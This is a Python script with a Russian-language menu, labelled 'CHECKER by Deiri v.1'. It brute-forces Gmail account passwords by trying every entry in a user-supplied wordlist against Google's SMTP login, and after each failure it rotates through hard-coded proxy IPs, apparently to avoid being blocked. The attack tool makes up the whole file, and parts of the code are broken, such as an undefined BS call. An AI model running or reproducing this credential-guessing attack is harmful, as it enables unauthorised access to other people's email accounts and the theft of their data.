
import random
import bs4
import smtplib
import os
import time
import urllib.request
import socket
import urllib.error
import requests
from requests.auth import HTTPProxyAuth
from bs4 import BeautifulSoup
import colorama
from colorama import init, Fore, Back
from os import system
init()
print(Fore.BLUE + "")
os.system('clear')
print('╔═══╗╔╗─╔╗╔═══╗╔═══╗╔╗╔═╗╔═══╗╔═══╗')
print('║╔═╗║║║─║║║╔══╝║╔═╗║║║║╔╝║╔══╝║╔═╗║')
print('║║─╚╝║╚═╝║║╚══╗║║─╚╝║╚╝╝─║╚══╗║╚═╝║')
print('║║─╔╗║╔═╗║║╔══╝║║─╔╗║╔╗║─║╔══╝║╔╗╔╝')
print('║╚═╝║║║─║║║╚══╗║╚═╝║║║║╚╗║╚══╗║║║╚╗')
print('╚═══╝╚╝─╚╝╚═══╝╚═══╝╚╝╚═╝╚═══╝╚╝╚═╝')
print("")
print("")
print("by Deiri  v.1")
print("")
print("")
print ('Начать поиск пароля?:')
print ("")
print ("[1] Да")
print ("[2] Нет")
print("")
option = input('Введите: ')
os.system("clear")
print('╔═══╗╔╗─╔╗╔═══╗╔═══╗╔╗╔═╗╔═══╗╔═══╗')
print('║╔═╗║║║─║║║╔══╝║╔═╗║║║║╔╝║╔══╝║╔═╗║')
print('║║─╚╝║╚═╝║║╚══╗║║─╚╝║╚╝╝─║╚══╗║╚═╝║')
print('║║─╔╗║╔═╗║║╔══╝║║─╔╗║╔╗║─║╔══╝║╔╗╔╝')
print('║╚═╝║║║─║║║╚══╗║╚═╝║║║║╚╗║╚══╗║║║╚╗')
print('╚═══╝╚╝─╚╝╚═══╝╚═══╝╚╝╚═╝╚═══╝╚╝╚═╝')
print("")
print("by Deiri  v.1")
print("")
print("")
if option == '1':
   passlist = input('Для начала введите путь к словарю: ')
if option == '2':
   exit()
pass_found=open(passlist, 'r')
user_name = input('Логин : ')
print("")
server = smtplib.SMTP('smtp.googlemail.com',587)
server.ehlo()
server.starttls()
for password in pass_found:
   try:
       server.login(user_name, password)
       print(Fore.GREEN + '[+] Пароль найден: ' + password)
       break;
   except smtplib.SMTPAuthenticationError:
      print(Fore.RED + '[-] Поиск пароля')
      print("")
      go = ['120.203.215.6:80', '78.41.246.137:80', '104.202.117.238:80', '104.202.117.53:80', '104.202.117.106']
      jo = random.choice(go)
      url = 'http://smtp.googlemail.com'
      proxies = {'https': jo}
      response = requests.get(url=url, proxies=proxies)
      html = BS(response.content, 'html.parser')
      print(html)
      print(response.status_code)
input()